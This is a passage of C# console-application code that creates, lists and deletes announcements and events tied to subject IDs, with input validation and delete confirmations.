    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    Console.Write("Title: ");
    var title = Console.ReadLine() ?? "";
    
    Console.Write("Content: ");
    var content = Console.ReadLine() ?? "";

    if (string.IsNullOrWhiteSpace(title) || string.IsNullOrWhiteSpace(content))
    {
        Console.WriteLine("Title and content are required!");
        return;
    }

    announcementManager.CreateAnnouncement(subjectId, title, content);
    Console.WriteLine("Announcement created successfully!");
}

void DeleteAnnouncement()
{
    Console.WriteLine("\n=== Delete Announcement ===");
    
    Console.Write("Enter Announcement ID to delete: ");
    if (!int.TryParse(Console.ReadLine(), out int announcementId))
    {
        Console.WriteLine("Invalid Announcement ID!");
        return;
    }

    Console.Write("Are you sure? (y/n): ");
    var confirm = Console.ReadLine()?.ToLower();

    if (confirm == "y")
    {
        announcementManager.DeleteAnnouncement(announcementId);
        Console.WriteLine("Announcement deleted successfully!");
    }
}

void ViewEventsForSubject()
{
    Console.Write("\nEnter Subject ID: ");
    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    var subject = subjectManager.GetSubjectById(subjectId);
    if (subject == null)
    {
        Console.WriteLine("Subject not found!");
        return;
    }

    Console.WriteLine($"\nSubject: {subject.Title}");
    var events = eventManager.GetEventsForSubject(subjectId);
    
    if (events.Count == 0)
    {
        Console.WriteLine("No events found for this subject.");
        return;
    }

    Console.WriteLine($"\n{"ID",-5} {"Name",-30} {"Date",-20} {"Location",-20}");
    Console.WriteLine(new string('-', 80));
    
    foreach (var ev in events)
    {
        Console.WriteLine($"{ev.Id,-5} {ev.Name,-30} {ev.Date:yyyy-MM-dd HH:mm,-20} {ev.Location,-20}");
    }
    
    Console.WriteLine($"\nTotal events: {events.Count}");
}

void CreateEvent()
{
    Console.WriteLine("\n=== Create New Event ===");
    
    Console.Write("Subject ID: ");
    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    Console.Write("Event Name: ");
    var name = Console.ReadLine() ?? "";
    
    Console.Write("Date (yyyy-MM-dd HH:mm): ");
    var dateStr = Console.ReadLine();
    
    if (!DateTime.TryParse(dateStr, out DateTime date))
    {
        Console.WriteLine("Invalid date format!");
        return;
    }

    Console.Write("Location: ");
    var location = Console.ReadLine() ?? "";

    if (string.IsNullOrWhiteSpace(name))
    {
        Console.WriteLine("Event name is required!");
        return;
    }

    eventManager.CreateEvent(subjectId, date, name, location);
    Console.WriteLine("Event created successfully!");
}

void DeleteEvent()
{
    Console.WriteLine("\n=== Delete Event ===");
    
    Console.Write("Enter Event ID to delete: ");
    if (!int.TryParse(Console.ReadLine(), out int eventId))
    {
        Console.WriteLine("Invalid Event ID!");
        return;
    }

    Console.Write("Are you sure? (y/n): ");
    var confirm = Console.ReadLine()?.ToLower();

    if (confirm == "y")
    {
        eventManager.DeleteEvent(eventId);
        Console.WriteLine("Event deleted successfully!");
    }
}
